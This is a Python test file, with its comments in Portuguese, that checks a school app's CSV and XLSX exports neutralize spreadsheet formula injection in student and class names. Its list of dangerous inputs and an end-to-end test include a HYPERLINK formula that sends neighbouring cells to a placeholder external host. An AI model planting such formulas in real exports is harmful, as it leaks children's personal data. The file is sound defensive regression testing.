"""Injeção de fórmula nas exportações CSV/XLSX — regressão do e97.

Antes: ``gerar_xlsx`` gravava todo ``str`` iniciado por '=' como FÓRMULA (o openpyxl
faz isso sozinho) e ``gerar_csv`` escrevia o texto cru. Um nome de aluno ou de turma
como ``=HYPERLINK("https://...?d="&B4&B5,"Atualizar")`` virava, no arquivo aberto
por outra pessoa, um link que leva os nomes das crianças vizinhas para fora.

Nomes e valores aqui são fictícios (fórmulas inofensivas).
"""
import csv
import io

import pytest
from openpyxl import load_workbook

from app.core.config import settings
from app.services import relatorios

PERIGOSOS = ["=1+1", "+1", "-1", "@SUM(1)", "\t=1", "\r=1",
             '=HYPERLINK("https://exemplo.invalid/?d="&B4,"Atualizar")']


def _celulas_xlsx(conteudo: bytes) -> list:
    ws = load_workbook(io.BytesIO(conteudo)).active
    return [c for linha in ws.iter_rows() for c in linha if c.value is not None]


def _campos_csv(conteudo: bytes) -> list[list[str]]:
    texto = conteudo.decode("utf-8-sig")
    return list(csv.reader(io.StringIO(texto, newline=""), delimiter=";"))


# --- Auxiliar único ---------------------------------------------------------------

@pytest.mark.parametrize("valor", PERIGOSOS)
def test_celula_segura_neutraliza_texto(valor):
    assert relatorios.celula_segura(valor) == "'" + valor


@pytest.mark.parametrize("valor", [-3, -2.5, 0, 7, None, "Ana Ficticia", "3º Ano A",
                                   "O Pequeno Príncipe", "'já com apóstrofo"])
def test_celula_segura_nao_mexe_no_resto(valor):
    assert relatorios.celula_segura(valor) == valor


# --- Geradores --------------------------------------------------------------------

def test_csv_prefixa_apostrofo_so_no_texto_perigoso():
    cabecalho = ["Aluno", "=Turma", "Nota"]
    linhas = [[v, "3º Ano A", -1.5] for v in PERIGOSOS] + [["Ana Ficticia", "-x", 7]]
    campos = _campos_csv(relatorios.gerar_csv(cabecalho, linhas))
    assert campos[0] == ["Aluno", "'=Turma", "Nota"]
    for valor, linha in zip(PERIGOSOS, campos[1:]):
        assert linha[0] == "'" + valor
        assert linha[1] == "3º Ano A"
        assert linha[2] == "-1.5"                 # número negativo segue número
    assert campos[-1] == ["Ana Ficticia", "'-x", "7"]


def test_xlsx_nunca_grava_formula():
    linhas = [[v, -1.5] for v in PERIGOSOS]
    conteudo = relatorios.gerar_xlsx("Lista", "=ESCOLA FICTICIA", "#1B2A4A",
                                     ["Aluno", "Nota"], linhas)
    celulas = _celulas_xlsx(conteudo)
    assert not [c.coordinate for c in celulas if c.data_type == "f"]
    por_valor = {c.value: c for c in celulas}
    assert por_valor["=1+1"].data_type == "s"           # texto, como foi digitado
    assert por_valor[PERIGOSOS[-1]].data_type == "s"
    assert por_valor["=ESCOLA FICTICIA — Lista"].data_type == "s"   # título (linha 1)
    assert por_valor[-1.5].data_type == "n"


# --- Ponta a ponta: nome de aluno e de turma em /relatorios/alunos ---------------------

def test_relatorio_de_alunos_neutraliza_nome_de_aluno_e_de_turma(cliente, escola_completa,
                                                                 monkeypatch, tmp_path):
    monkeypatch.setattr(settings, "EXPORTS_DIR", tmp_path)
    eid = escola_completa["escola"].id
    turma = escola_completa["turma"]
    alunos = escola_completa["alunos"]
    nomes = ["=1+1", "+1", "-1"]
    for aluno, nome in zip(alunos, nomes):
        r = cliente.patch(f"/api/v1/escolas/{eid}/alunos/{aluno.id}", json={"nome": nome})
        assert r.status_code == 200, r.text
    nome_turma = '=HYPERLINK("https://exemplo.invalid/","x")'
    r = cliente.put(f"/api/v1/escolas/{eid}/turmas/{turma.id}", json={"nome": nome_turma})
    assert r.status_code == 200, r.text

    r = cliente.get(f"/api/v1/escolas/{eid}/relatorios/alunos", params={"formato": "xlsx"})
    assert r.status_code == 200, r.text
    celulas = _celulas_xlsx(r.content)
    assert not [c.coordinate for c in celulas if c.data_type == "f"]
    valores = {c.value for c in celulas}
    assert {*nomes, nome_turma} <= valores                 # o texto sai como foi gravado

    r = cliente.get(f"/api/v1/escolas/{eid}/relatorios/alunos", params={"formato": "csv"})
    assert r.status_code == 200, r.text
    dados = _campos_csv(r.content)[1:]
    assert sorted(linha[0] for linha in dados) == sorted("'" + n for n in nomes)
    assert {linha[1] for linha in dados} == {"'" + nome_turma}
    for linha in dados:
        assert not any(campo.startswith(relatorios._INICIO_DE_FORMULA) for campo in linha)


def test_relatorio_de_alunos_arroba_e_tab(cliente, escola_completa, monkeypatch, tmp_path):
    monkeypatch.setattr(settings, "EXPORTS_DIR", tmp_path)
    eid = escola_completa["escola"].id
    alunos = escola_completa["alunos"]
    for aluno, nome in zip(alunos, ["@SUM(1)", "\t=1"]):
        r = cliente.patch(f"/api/v1/escolas/{eid}/alunos/{aluno.id}", json={"nome": nome})
        assert r.status_code == 200, r.text
    r = cliente.get(f"/api/v1/escolas/{eid}/relatorios/alunos", params={"formato": "csv"})
    assert r.status_code == 200, r.text
    for linha in _campos_csv(r.content)[1:]:
        assert not any(campo.startswith(relatorios._INICIO_DE_FORMULA) for campo in linha)
    r = cliente.get(f"/api/v1/escolas/{eid}/relatorios/alunos", params={"formato": "xlsx"})
    assert not [c.coordinate for c in _celulas_xlsx(r.content) if c.data_type == "f"]
